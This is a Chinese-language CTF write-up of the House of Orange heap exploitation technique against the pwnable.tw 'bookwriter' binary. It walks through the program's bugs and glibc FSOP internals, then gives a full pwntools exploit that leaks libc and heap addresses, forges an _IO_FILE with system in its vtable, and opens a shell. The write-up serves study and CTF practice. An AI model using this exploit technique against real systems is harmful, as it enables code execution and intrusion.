# house of orange

标签（空格分隔）： pwn

---

由于最近做到了一道很恶心的题目，导致我对于堆的一些理解认知产生了怀疑。于是决定补习一下一些堆的高级利用方法
题目来自于pwnable.tw的bookwriter
源程序是很典型的表单程序，唯一的特殊之处在于没有free函数，所以利用方式不同于以往
漏洞点有以下几个地方：
1.author变量与存储堆地址的指针列表相连，在我们打印出author信息的时候会将堆地址泄露

    bss:0000000000602060 author          db    ? ;
    .
    .
    .
    bss:00000000006020A0 addrlist        db ?

2.add函数对于下标的检查有误

     for ( i = 0; ; ++i )                          // max 8
      {
        if ( i > 8 )
          return puts("You can't add new page anymore!");
        if ( !addrlist[i] )
          break;
      }

我们在可以看见下标可以为8，而addrlist大小为8，这就意味着我们可以多输入一个page，数组越界。

    bss:00000000006020A0 addrlist        db ? 
    .
    .
    .
    bss:00000000006020E0 lenlist         dq ?     
这样我们就可以把page[0]的长度改写为一个堆地址值，这样在我们edit的时候就可以利用他的长度来覆写之后的堆块信息，也就是堆溢出。
3.input函数对于字符串的处理

    __int64 __fastcall get_input(__int64 ptr, unsigned int len)
    {
      unsigned int v3; // [rsp+1Ch] [rbp-4h]
    
      v3 = _read_chk(0LL, ptr, len, len);
      if ( (v3 & 0x80000000) != 0 )
      {
        puts("read error");
        exit(1);
      }
      if ( *(_BYTE *)((signed int)v3 - 1LL + ptr) == '\n' )// no \x00 leak
        *(_BYTE *)((signed int)v3 - 1LL + ptr) = 0;
      return v3;
    }
这里可以看到，如果我们输入的字符串长度为len的话，结尾不会以\x00做截断，这样就会导致leak
（他只是判断了最后一位是否为\n，如果是的话就换成0）
4.edit函数

    int edit()
    {
      unsigned int v1; // [rsp+Ch] [rbp-4h]
    
      printf("Index of page :");
      v1 = input_pus();
      if ( v1 > 7 )
      {
        puts("out of page:");
        exit(0);
      }
      if ( !addrlist[v1] )
        return puts("Not found !");
      printf("Content:");
      get_input((__int64)addrlist[v1], lenlist[v1]);
      lenlist[v1] = strlen(addrlist[v1]);
      return puts("Done !");
    }
可以看到每次edit都会更新长度列表中的值，而strlen是以0作为截断，在上面的getinput函数中会明显发现当输入长度为len时不会加入0截断，这样我们就可以把下一个相邻堆块的头部读入算入长度，进一步的，我们就可以改写下一个堆块的size字段

漏洞利用的一些前置知识：
topchunk size小于申请大小, top chunk 加入unsorted bin中, 系统重新分配一块top chunk. 
首次加入unsorted bin的chunk块, 若再次使用此chunk, glibc会将其先加入对应small　bin中, 再从small bin取出使用, 剩余的加入到unsorted bin中. 
FSOP是FILE Stream Oriented Programming的缩写, 进程内所有的_IO_FILE结构会使用_chain域相互连接成一个链表, 这个链表的头部由_IO_list_all维护. 
FSOP的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项, 但是单纯的伪造只是伪造了数据还需要某种方法进行触发. 

这些基本就是本题目的一些基本思想

首先我们需要改写topchunk的size字段，使其缩小，但是我们需要考虑一些关于页面对齐以及其他的一些因素，这里引用了天舒的一句话：

    1.top_chunk_size>MINSIZE(MINISIZE)没有查到是多少，反正不要太小都行
    2.top_chunk需要有pre_in_use位置1
    3.top_chunk需要和原来的堆页在一个页上，说白了就是原先top chunk的size最高位置0，比如原来size为0x20fa0，应修改为0xfa0。
    
根据以上的准则改写topchunk大小之后，会触发一些操作：
topchunk size小于申请大小, top chunk 加入unsorted bin中, 系统重新分配一块top chunk. 
这样在unsortedbin中我们就有了原先的topchunk，以后的每次分配只要大小小于此chunk的话就会使其分割而后分配，这样我们申请一个大小小于此chunk大小的堆块时其原有的bk指针会保留，进一步就leak出了libc地址

而后由于我们在伪造file结构时需要在堆中伪造，但是我们并不知道其地址，这里我们就可以把author输入为0x40的字符串，进一步查看author时就可以泄露出heap地址

有了heap地址之后我们通过下标溢出将page[0]的大小设置为一个值很大的地址，这样我们就可以通过编辑page[0]来构造伪造的file结构

这里涉及到了一些很巧妙地操作
首先我们利用unsorted bin attack将io_list_all的地址修改为unsorted bin的地址
这里列一下iofile的文件结构：

    struct _IO_FILE {
      int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
    #define _IO_file_flags _flags
    
      /* The following pointers correspond to the C++ streambuf protocol. */
      /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
      char* _IO_read_ptr;   /* Current read pointer */
      char* _IO_read_end;   /* End of get area. */
      char* _IO_read_base;  /* Start of putback+get area. */
      char* _IO_write_base; /* Start of put area. */
      char* _IO_write_ptr;  /* Current put pointer. */
      char* _IO_write_end;  /* End of put area. */
      char* _IO_buf_base;   /* Start of reserve area. */
      char* _IO_buf_end;    /* End of reserve area. */
      /* The following fields are used to support backing up and undo. */
      char *_IO_save_base; /* Pointer to start of non-current get area. */
      char *_IO_backup_base;  /* Pointer to first valid character of backup area */
      char *_IO_save_end; /* Pointer to end of non-current get area. */
    
      struct _IO_marker *_markers;
    
      struct _IO_FILE *_chain;
    
      int _fileno;
    #if 0
      int _blksize;
    #else
      int _flags2;
    #endif
      _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
    
    #define __HAVE_COLUMN /* temporary */
      /* 1+column number of pbase(); 0 is unknown. */
      unsigned short _cur_column;
      signed char _vtable_offset;
      char _shortbuf[1];
    
      /*  char* _save_gptr;  char* _save_egptr; */
    
      _IO_lock_t *_lock;
    #ifdef _IO_USE_OLD_IO_FILE
    };

我们关注的chain字段在偏移为14的地方，由于我们已经把io_list_all修改为unsortedbin地址，那么他所指向的下一个地址就存储在unsorted bin + 14的地方，这个地址位于main arena中，存储的是大小为0x60的smallbin（smallbin[4]），所以我们需要将原unsorted chunk的size改为0x60，之后再次执行malloc时，就会将其置入unsorted bin + 14的地方。
当程序分配内存错误时，会触发以下的函数：
malloc_printerr==>libc_message==>abort==>IO_flush_all_lockp
因为vtable中的函数调用时会把对应的_IO_FILE_plus指针作为第一个参数传递，因此这里我们把"/bin/sh"写入_IO_FILE_plus头部。
另外需要将

    1.fp->mode>0
    2._IO_vtable_offset (fp) ==0
    3.fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base

这样的条件来构造fake file
再次申请堆块触发报错，（因为原来的堆块已经被我们搞的面目全非了，肯定报错），进而触发malloc_printerr==>libc_message==>abort==>IO_flush_all_lockp
这里vtable的结构为：

    287 struct _IO_jump_t
    288 {
    289     JUMP_FIELD(size_t, __dummy);
    290     JUMP_FIELD(size_t, __dummy2);
    291     JUMP_FIELD(_IO_finish_t, __finish);
    292     JUMP_FIELD(_IO_overflow_t, __overflow);
    293     JUMP_FIELD(_IO_underflow_t, __underflow);
    294     JUMP_FIELD(_IO_underflow_t, __uflow);
    295     JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    296     /* showmany */
    297     JUMP_FIELD(_IO_xsputn_t, __xsputn);
    298     JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    299     JUMP_FIELD(_IO_seekoff_t, __seekoff);
    300     JUMP_FIELD(_IO_seekpos_t, __seekpos);
    301     JUMP_FIELD(_IO_setbuf_t, __setbuf);
    302     JUMP_FIELD(_IO_sync_t, __sync);
    303     JUMP_FIELD(_IO_doallocate_t, __doallocate);
    304     JUMP_FIELD(_IO_read_t, __read);
    305     JUMP_FIELD(_IO_write_t, __write);
    306     JUMP_FIELD(_IO_seek_t, __seek);
    307     JUMP_FIELD(_IO_close_t, __close);
    308     JUMP_FIELD(_IO_stat_t, __stat);
    309     JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    310     JUMP_FIELD(_IO_imbue_t, __imbue);
    311 #if 0
    312     get_column;
    313     set_column;
    314 #endif
    315 };
调用的是overflow那里，把它改成system就行了
exp：

    from pwn import *
    
    io = process('./bookwriter')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    elf = ELF('bookwriter')
    context.log_level = 'debug'
    def add(size,content):
    	io.recvuntil('choice :')
    	io.sendline('1')
    	io.recvuntil('page :')
    	io.sendline(str(size))
    	io.recvuntil('Content :')
    	io.sendline(content)
    def view(idx):
    	io.recvuntil('choice :')
    	io.sendline('2')
    	io.recvuntil('page :')
    	io.sendline(str(idx))
    def edit(idx,content):
    	io.recvuntil('choice :')
    	io.sendline('3')
    	io.recvuntil('page :')
    	io.sendline(str(idx))
    	io.recvuntil('Content:')
    	io.sendline(content)
    def info():
    	io.recvuntil('choice :')
    	io.sendline('4')
    
    name = 'secunda'
    io.recvuntil('Author :')
    Author = 'A'*0x40
    io.send(Author)
    # Heap Overflow to Modify TopChunk Size
    add(0x28,'0'*0x28)          #id=0
    edit(0,'1'*0x28)
    edit(0,'\x00'*0x28+p16(0xfd1)+"\x00")
     
    # Trigger sysmalloc ==> _int_free TopChunk
    add(0x1000,'1'+'\n')        #id=1
     
    # leak libc_base
    add(0x1,'x')                #id=2
    view(2)
    io.recvuntil('Content :\n')
    leak = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))
    print hex(leak)
    libc_base = leak - libc.symbols['__malloc_hook'] - 1560 - 0x20
    log.info('libbase:'+hex(libc_base))
    system_addr = libc_base+libc.symbols['system']
    log.info('system_addr:'+hex(system_addr))
    IO_list_all = libc_base+libc.symbols['_IO_list_all']
    log.info('_IO_list_all:'+hex(IO_list_all))
    
    
    info()
    io.recvuntil('A'*0x40)
    heap = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x10
    print hex(leak)
    io.recvuntil(')')
    io.sendline('1')
    io.recvuntil(':')
    io.sendline('A'*0x40)
    
    for i in range(0x3,0x9):
        add(0x20,str(i)*0x20)
    vtable_addr = heap+0x248
    payload = 0x2c*p64(0)
        #Fake File_stream in smallbin[4]
    fake_stream = ""
    fake_stream = "/bin/sh\x00"+p64(0x61)
    fake_stream += p64(0)+p64(IO_list_all-0x10)
    fake_stream = fake_stream.ljust(0xa0,'\x00')
    fake_stream += p64(heap+0x240)
    fake_stream = fake_stream.ljust(0xc0,'\x00')
    fake_stream += p64(1)+2*p64(0)+p64(vtable_addr)
    payload += fake_stream
    payload += p64(2)
    payload += p64(3)
    payload += p64(system_addr)
    gdb.attach(io)
    edit(0,payload)
    gdb.attach(io)
        # Trigger UnsortedBin Attack
        # malloc_printerr==>libc_message==>abort==>IO_flush_all_lockp
    io.recvuntil('Your choice :')
    io.sendline(str(1))
    io.recvuntil('Size of page :')
    io.sendline(str(0x10))
    io.interactive()

